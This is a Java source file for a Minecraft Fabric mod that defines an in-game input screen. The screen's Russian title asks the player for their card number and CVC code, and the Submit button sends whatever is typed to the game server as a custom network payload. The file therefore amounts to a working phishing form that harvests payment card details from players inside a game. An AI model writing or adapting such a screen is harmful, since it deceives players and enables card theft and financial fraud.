package com.sitael.gui;

import com.sitael.networking.SendProtobuffDataC2SPayload;
import com.sitael.Proto;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.client.gui.widget.TextWidget;
import net.minecraft.text.Text;

public class InputScreen extends Screen {
    private TextFieldWidget textField;
    private TextWidget title;
    private ButtonWidget button;

    public InputScreen() {
        super(Text.literal("Input"));
    }

    @Override
    protected void init() {
        super.init();
        this.textField = new TextFieldWidget(
                this.textRenderer,
                this.width / 2 - 150, this.height / 2 - 10, 250, 20,
                Text.literal("Enter message")
        );
        this.textField.setMaxLength(256);
        this.addSelectableChild(this.textField);
        this.setInitialFocus(this.textField);
        this.button = ButtonWidget.builder(
                        Text.literal("Submit"),
                        button -> {
                            sendMessage();
                        }
                )
                .dimensions(this.width / 2 + 105, this.height / 2 - 10, 60, 20)
                .build();

        this.addDrawableChild(this.button);
        this.title = new TextWidget(
                this.width / 2 - 150, this.height / 2 - 40, 250, 20,
                Text.literal("Номер и cvc код вашей карты:"),
                this.textRenderer
        );

    }

    private void sendMessage() {
        String message = this.textField.getText().trim();
        if (!message.isEmpty()) {
            if (this.client != null && this.client.getNetworkHandler() != null) {
                Proto.Message protoMessage = Proto.Message.newBuilder()
                        .setText(message)
                        .build();
                SendProtobuffDataC2SPayload payload = new SendProtobuffDataC2SPayload(protoMessage.toByteArray());
                ClientPlayNetworking.send(payload);
            }
        }
        this.close();
    }

    @Override
    public void render(net.minecraft.client.gui.DrawContext context, int mouseX, int mouseY, float delta) {
        context.fill(0, 0, width, height, 0x80000000);
        this.textField.render(context, mouseX, mouseY, delta);
        this.title.render(context, mouseX, mouseY, delta);
        this.button.render(context, mouseX, mouseY, delta);
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        if (keyCode == 256) { // ESC
            this.close();
            return true;
        }
        return super.keyPressed(keyCode, scanCode, modifiers);
    }
}
